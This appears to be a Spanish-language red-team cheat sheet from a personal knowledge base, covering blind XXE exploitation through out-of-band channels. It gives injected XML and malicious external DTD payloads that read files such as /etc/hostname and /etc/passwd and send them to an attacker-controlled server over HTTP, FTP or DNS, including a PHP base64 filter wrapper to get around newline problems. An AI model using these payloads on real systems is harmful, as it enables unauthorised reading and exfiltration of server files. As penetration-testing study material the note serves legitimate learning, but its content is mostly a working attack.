---
aliases:
tags:
  - type/technique
  - vuln/xxe
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[XML External Entity (XXE)]]"
---
# XXE - Out-of-Band (OOB) y DTDs Externos

***

## Cheatsheet

| **Objetivo Estratégico**                           | **Descripción de la Técnica**                                                                                                                                                                                      | **Estructura del Payload y DTD**                                                                                                                                                                                                                                                                                      |
| -------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Exfiltración de Datos vía HTTP (GET)**           | Extraigo el contenido concatenándolo como un parámetro de consulta (`?data=`) en una petición HTTP dirigida a mi servidor de captura de logs.                                                                      | **XML Inyectado:**<br>`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://mi-servidor.com/malicioso.dtd"> %xxe;]><foo/>`<br><br>**malicioso.dtd:**<br>`<!ENTITY % file SYSTEM "file:///etc/hostname">`<br>`<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://mi-servidor.com/?data=%file;'>">`<br>`%eval;`<br>`%exfil;` |
| **Exfiltración vía FTP o protocolos alternativos** | Cuando el tráfico HTTP saliente está filtrado o inspeccionado, intento extraer los datos forzando al parser (comúnmente en Java) a utilizar otros esquemas URI soportados, como FTP.                               | **malicioso.dtd (Variante FTP):**<br>`<!ENTITY % file SYSTEM "file:///etc/hostname">`<br>`<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://mi-servidor.com/%file;'>">`<br>`%eval;`<br>`%exfil;`                                                                                                                   |
| **Detección Ciega vía DNS (Interacción OOB)**      | Si no busco extraer un archivo sino únicamente confirmar la existencia de la vulnerabilidad de resolución de entidades, provoco una simple búsqueda DNS hacia un dominio bajo mi control (como Burp Collaborator). | **XML Inyectado (Sin DTD Externo):**<br>`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://subdominio-unico.mi-servidor.com/test"> %xxe;]><foo/>`                                                                                                                                                                          |

^xxe-oob

## Consideraciones Críticas y Restricciones

- **Limitaciones por Caracteres de Nueva Línea:** Extraer archivos multilínea (como `/etc/passwd` o claves RSA) a través de URLs (HTTP GET) suele fallar porque los caracteres de salto de línea rompen la sintaxis de la petición HTTP en muchos parsers modernos.
- **Uso de Wrappers para Evasión:** Para solucionar la ruptura por saltos de línea o caracteres especiales en aplicaciones PHP, modifico la entidad que lee el archivo para utilizar el filtro Base64: `<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">`. Esto garantiza que los datos viajen de forma segura a través de la URL. En Java o .NET, las opciones son más limitadas y a menudo requieren exfiltración basada en FTP o la redefinición de DTDs locales.
- **Firewalls de Salida (Egress Filtering):** El éxito absoluto de esta técnica recae en que el servidor víctima tenga permitido iniciar conexiones hacia Internet (o hacia el segmento de red donde controlo el servidor de captura). Si el entorno aplica políticas de _Deny All_ saliente, el ataque OOB fallará y deberé pivotar hacia la exfiltración basada en errores usando DTDs locales.


***

## Overview


La exfiltración Out-of-Band (OOB) es la técnica táctica fundamental cuando me enfrento a una vulnerabilidad de [[Blind XXE]] donde la aplicación procesa el XML pero no refleja el contenido en la respuesta HTTP ni arroja errores detallados. Para lograr la extracción de datos, recurro a entidades de parámetros (`%`) y la carga de un DTD externo para forzar al servidor a enviar el contenido del archivo objetivo hacia una infraestructura bajo mi control mediante peticiones de red (HTTP, FTP o DNS).

### Mecanismo de Acción

El estándar XML prohíbe el uso de entidades de parámetros para definir dinámicamente otras entidades dentro del subconjunto DTD interno (el preámbulo que envío en mi petición). Para evadir esta restricción, la estrategia requiere dos componentes:
1. **Payload Inyectado:** Un bloque XML inicial que instruye al parser a conectarse a mi servidor y descargar un archivo DTD externo.
2. **DTD Externo:** Un archivo alojado en mi infraestructura que contiene la lógica de encadenamiento. Este DTD lee el archivo local del servidor víctima y define dinámicamente una nueva entidad que adjunta el contenido leído como un parámetro en una solicitud saliente.


***

## Notas Relacionadas


***
